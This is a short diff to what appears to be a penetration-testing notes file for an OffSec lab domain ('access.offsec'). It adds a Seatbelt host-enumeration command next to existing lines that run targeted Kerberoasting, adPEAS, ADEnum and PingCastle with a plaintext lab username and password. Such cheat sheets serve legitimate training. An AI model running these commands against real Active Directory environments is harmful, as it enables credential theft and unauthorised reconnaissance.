@@ -79,4 +79,6 @@ python /opt/windows/targetedKerberoast/targetedKerberoast.py -d $dom -u 'hrapp-s
 Invoke-adPEAS -Domain 'access.offsec' -Server 'dc.access.offsec' -Username 'access\svc_mssql' -Password 'trustno1' -Force
 Invoke-ADEnum -AllEnum -Force
 .\pingcastle.exe --healthcheck --user access\svc_mssql --password trustno1 --level Full
+
+.\Seatbelt.exe -group=all
 ```
